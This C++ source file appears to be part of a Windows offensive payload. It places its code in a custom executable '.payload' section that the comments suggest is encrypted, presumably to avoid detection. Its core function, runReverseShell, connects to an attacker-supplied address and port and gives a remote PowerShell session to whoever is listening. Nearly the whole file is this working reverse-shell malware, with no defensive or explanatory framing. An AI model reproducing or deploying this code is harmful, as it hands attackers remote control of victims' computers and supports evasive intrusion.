#include "payload.h"
#include "init.cpp"

#pragma section(".payload", read, write, execute)
#pragma comment(linker, "/SECTION:.payload,ERW")

#pragma code_seg(".payload")

void print_whatever() {
	printf("mreow\n");
}

// connects to a listening remote computer and passes it a shell on the local computer
void runReverseShell(const char *address, const char *port) {

	// configure what we're connecting to
	ADDRINFOA hints;
    ZeroMemory(&hints, sizeof (hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
	// --
	PADDRINFOA addressInfo;
    auto errAddress = getaddrinfo(address, port, &hints, &addressInfo);
    if (errAddress) {
        std::cerr << "address info: " << errAddress << std::endl;
        throw std::runtime_error("getting address info");
    }

	// needs to speciffically be a WSASocket, unsure why, todo
	auto sock = WSASocketA(addressInfo->ai_family, addressInfo->ai_socktype, addressInfo->ai_protocol, NULL, NULL, NULL);
	if (sock == INVALID_SOCKET) {
		std::cerr << "creating socket: " << WSAGetLastError() << std::endl;
		throw std::runtime_error("creating socket");
	}

	// connect to remote computer
	if ( connect(sock, addressInfo->ai_addr, addressInfo->ai_addrlen) ) {
		std::cerr << "connecting socket: " << WSAGetLastError() << std::endl;
		throw std::runtime_error("connecting socket");
	}

	// setup communication with the shell process
	// just act like the socket is stdin+stdout+stderr
	STARTUPINFOA startupInfo;
	memset(&startupInfo, 0, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.dwFlags = STARTF_USESTDHANDLES;
	startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) sock;

	PROCESS_INFORMATION processInformation;
    ZeroMemory(&processInformation, sizeof(processInformation));

	// create shell
	if (!CreateProcessA("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
						NULL,
						NULL,
						NULL,
						true,
						0,
						NULL,
						NULL,
						&startupInfo,
						&processInformation))
	{
		std::cerr << "creating process: " << GetLastError() << std::endl;
		throw std::runtime_error("creating process");
	}

	// wait for the shell to exit
	WaitForSingleObject(processInformation.hProcess, INFINITE);
}

int start_payload(int argc, const char *argv[]) {
	payloadInit();

	// check that we have the correct number of args
	if (argc != 3) {
		std::cerr << "need exactly 2 arguments: address port" << std::endl;
		return 1;
	}
	// parse args
	const char *address = argv[1];
	const char *port = argv[2];

	// run main body
	int resultCode = S_OK;
	try {
		runReverseShell(address, port);
	} catch(std::exception& err) {
		std::cerr << "running payload: " << err.what() << std::endl;
		resultCode = S_FALSE;
	}

	payloadClean();
	return resultCode;
}

// seemingly doesnt automatically get set back to .text
// without this line a bunch of builtin functions get encrypted and prevent the program from launching properly
#pragma code_seg(".text")